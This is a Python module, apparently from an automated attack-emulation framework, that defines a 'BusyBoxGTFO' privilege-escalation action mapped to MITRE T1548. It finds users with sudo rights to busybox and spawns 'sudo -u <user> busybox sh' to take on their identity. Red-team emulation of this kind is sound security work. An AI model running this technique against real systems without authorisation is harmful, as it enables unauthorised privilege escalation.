from typing import Union

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.action_utils import run_command
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, GraphDB, MultiPattern, Pattern, Relationship
from Session import SessionManager


class BusyBoxGTFO(Action):
    """
    Run busybox command as another user.
    """

    def __init__(self):
        super().__init__(
            "BusyBoxGTFO", "T1548 Abuse Elevation Control Mechanism", "TA0004 Privilege Escalation", ["quiet", "fast"]
        )
        self.noise = 0.5
        self.impact = 0.6

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action.
        """
        user = pattern.get('user').get('username')
        session = pattern.get('session')._id
        permission = pattern.get('permission')._id
        return [f"Change user to {user} in session ({session}) with permission ({permission})"]

    def get_target_patterns(self, kg: GraphDB) -> list[Union[Pattern, MultiPattern]]:
        """
        get_target_patterns check to identify a user with permission to run the busybox
        command.
        """
        session = Entity('Session', alias='session')
        pattern = (
            Entity(type='User', alias='user')
            .with_edge(Relationship(type='has'))
            .with_node(Entity(type='Permission', alias='permission', command='/usr/bin/busybox'))
            .combine(session)
        )
        return kg.match(pattern).where('user.username = session.username')

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Establish busybox session as another user.
        """
        session = pattern.get('session')
        session_id = session.get("id")
        permission = pattern.get('permission')
        as_user = permission.get('as_user')
        channel = sessions.get_session(session_id)
        cmd = ["sudo", "-u", as_user, "busybox", "sh"]
        output = run_command(channel, " ".join(cmd))
        return ActionExecutionResult(command=cmd, session=session_id, stdout="\n".join(output))

    def capture_state_change(
        self, kg: GraphDB, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """
        Update session object to reflect a change in protocol.
        """
        session = pattern.get('session')
        permission = pattern.get('permission')
        as_user = permission.get('as_user')
        update_session = session.copy()
        update_session.set('active', False)
        changes: StateChangeSequence = [(session, "update", update_session)]
        busybox_session = Entity(
            'Session',
            alias='busybox_session',
            protocol='busybox',
            username=as_user,
            active=True,
            executes_on=session.get('executes_on'),
            id=session.get('id'),
        )
        merge_pattern = update_session.with_edge(Relationship('spawned', direction='r')).with_node(busybox_session)
        changes.append((update_session, "merge", merge_pattern))
        return changes